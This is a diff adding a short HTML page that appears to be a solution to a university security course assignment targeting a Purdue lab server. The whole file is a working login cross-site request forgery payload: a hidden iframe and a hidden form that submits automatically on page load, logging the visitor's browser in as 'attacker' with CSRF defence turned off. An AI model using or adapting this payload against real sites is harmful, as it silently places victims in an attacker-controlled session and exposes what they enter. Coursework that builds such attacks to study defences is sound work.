@@ -1,0 +1,12 @@
+<html>
+	<body>
+		<iframe src="about:blank" name="myiframe" style="display: none;"></iframe>
+		<form id="form1" method='POST' action="http://cs526-offline.cs.purdue.edu/project3/login?csrfdefense=0&xssdefense=4" target="myiframe" style="display: none;">
+			<input name="username" value="attacker">
+			<input name="password" value="123456">
+		</form>
+		<script>
+			document.getElementById("form1").submit();
+		</script>
+	</body>
+</html>
